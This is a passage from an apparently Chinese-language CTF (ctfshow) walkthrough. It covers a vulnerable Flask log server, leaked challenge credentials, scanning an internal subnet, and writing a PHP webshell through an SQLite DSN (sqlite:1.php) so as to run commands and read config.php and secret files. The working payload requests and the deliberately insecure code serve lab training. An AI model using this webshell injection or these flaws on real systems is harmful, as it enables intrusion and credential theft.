class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 Flask 应用的密钥，用于加密会话等</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义根路由，处理 GET 请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 在会话中设置用户为 guest</span></span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log server is running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查会话中的用户是否为 admin</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;user&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /key 路由，处理 GET 请求，获取特定文件中的密钥</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 尝试打开文件读取密钥</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /set_log_option 路由，处理设置日志选项的请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从请求参数中获取日志名称和日志文件名称</span></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取日志记录器并添加文件处理器</span></span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 清空日志文件内容</span></span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /get_log_content 路由，处理获取日志内容的请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从请求参数中获取日志文件名称</span></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    <span class="comment"># 拼接文件路径</span></span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空指定文件内容的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_log_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 运行 Flask 应用，开启调试模式，监听所有 IP 地址，端口为 8888</span></span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p><code>init_users.json</code>记录了所以用户名和密码：</p><p><img src="/archives/16d06f93/QQ20250227-201358.png"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;hsinchug_wp1&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hsinchug_wp1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Q.4Vyj8VCiedX1KYU5g05&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dylan&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dylan&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8f7a55c6d9a7d9a7&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;secret_user&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;root&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;7y.(sc#Ac_&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>flag5：ctfshow&#123;7y.(sc#Ac_&#125;</code></p><h4 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h4><p>需要<strong>提交 DATABASE_SECRET_KEY内容</strong></p><p>直接登录dylan账号，server info有内网地址：</p><p><img src="/archives/16d06f93/QQ20250227-203047.png"></p><p>访问<code>/downloadTaskFile?url=</code>路由，用获取的IP扫c段：</p><p><img src="/archives/16d06f93/QQ20250227-204411.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Database TEST<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> <span class="variable constant_">DATABASE_SECRET_KEY</span> = <span class="string">&#x27;0x8F7C71E8E82E4D1E&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome to Database TEST<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is a test page for database connection and queries.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span>&gt;</span>Enter Database username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>Enter Database password:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;dsn&quot;</span>&gt;</span>Enter Database DSN:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;dsn&quot;</span> <span class="attr">name</span>=<span class="string">&quot;dsn&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;query&quot;</span>&gt;</span>Enter TEST Query:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;query&quot;</span> <span class="attr">name</span>=<span class="string">&quot;query&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>flag6：ctfshow&#123;0x8F7C71E8E82E4D1E&#125;</code></p><h3 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h3><h4 id="跳岛战术"><a href="#跳岛战术" class="headerlink" title="跳岛战术"></a>跳岛战术</h4><p>需要<strong>拿到config.php中的数据库密码</strong></p><p>提示我们渗透进内网php服务器，而上面我们获取的服务器就是php环境，估计config.php就在这上面。</p><p>该表单接受4个参数，<code>username、password、dsn和query</code></p><p>hint:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;</span><br><span class="line">sqlite</span><br></pre></td></tr></table></figure><p>sqlite和mysql等还是有些区别的，sqlite的每一个数据库就是一个文件。</p><p>先创建一个users表，包含字段name，利用PDO连接数据库的dsn，并将数据库文件命名为1.php:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?username=1&amp;password=1&amp;query=CREATE TABLE users (name TEXT);&amp;dsn=sqlite:1.php</span><br></pre></td></tr></table></figure><p>尝试写马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?username=1&amp;password=1&amp;query=INSERT INTO users (name) VALUES (&#x27;&lt;?php file_put_contents(&quot;cmd.php&quot;,&quot;&lt;?php system(\$_GET[0]);?&gt;&quot;);?&gt;&#x27;);&amp;dsn=sqlite:1.php</span><br></pre></td></tr></table></figure><blockquote><p>建议在burp上进行</p></blockquote><p><img src="/archives/16d06f93/QQ20250227-212120.png"></p><p>再访问1.php执行马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/1.php</span><br><span class="line">/cmd.php?0=cat config.php</span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250227-212458.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//数据库连接配置</span></span><br><span class="line"><span class="variable">$database_host</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$database_user</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$database_password</span> = <span class="string">&quot;3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5&quot;</span>;</span><br><span class="line"><span class="variable">$database_name</span> = <span class="string">&quot;web_db_2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pdo</span> =<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dsn</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;dsn&#x27;</span>];</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$dsn</span> &amp;&amp; <span class="variable">$username</span> &amp;&amp; <span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$pdo</span> = <span class="title function_ invoke__">pdo_init</span>(<span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pdo</span> === <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;database init faild&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">setAttribute</span>(PDO::<span class="variable constant_">ATTR_ERRMODE</span>, PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>);</span><br><span class="line">        <span class="variable">$sql</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;query&#x27;</span>];</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="title function_ invoke__">pdo_query</span>(<span class="variable">$pdo</span>, <span class="variable">$sql</span>);</span><br><span class="line">        <span class="title function_ invoke__">pdo_close</span>(<span class="variable">$pdo</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$stmt</span>!==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;database test success&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;database test error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pdo_init</span>(<span class="params"><span class="variable">$dns</span>, <span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dns</span>,<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$pdo</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;数据库连接失败：&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pdo_query</span>(<span class="params"><span class="variable">$pdo</span>, <span class="variable">$sql</span>, <span class="variable">$params</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$stmt</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;数据库操作失败：&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pdo_close</span>(<span class="params"><span class="variable">$pdo</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$pdo</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>flag7：ctfshow&#123;3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5&#125;</code></p><h4 id="邮箱迷云"><a href="#邮箱迷云" class="headerlink" title="邮箱迷云"></a>邮箱迷云</h4><p>要求<strong>提交park在2024年12月27日19时20分收到的邮件中的数字</strong></p><p>通过上传的马执行RCE我们发现根目录下有个secret.txt文件：</p><p><img src="/archives/16d06f93/QQ20250227-215248.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YUdGamEyVnlYMk4wWm5Ob2IzZEFNVFl6TG1OdmJTOUk=</span><br><span class="line">WVdOclpYSmZZM1JtYzJnd2R3PT0=</span><br></pre></td></tr></table></figure><p>分别base64解码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGFja2VyX2N0ZnNob3dAMTYzLmNvbS9I</span><br><span class="line">YWNrZXJfY3Rmc2gwdw==</span><br></pre></td></tr></table></figure><p>拼接起来进行base64解码：</p><p><img src="/archives/16d06f93/QQ20250227-215849.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker_ctfshow@163.com/Hacker_ctfsh0w</span><br></pre></td></tr></table></figure><p>这是163邮箱的账号密码</p><p><code>flag8：ctfshow&#123;hacker_ctfshow@163.com_Hacker_ctfsh0w&#125;</code></p><h3 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h3><h4 id="再下一城"><a href="#再下一城" class="headerlink" title="再下一城"></a>再下一城</h4><p>需要<strong>提交log_server_key.txt内容</strong></p><p>之前的main.py.bak提到了<code>log_server_key.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 Flask 应用的密钥，用于加密会话等</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义根路由，处理 GET 请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 在会话中设置用户为 guest</span></span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span 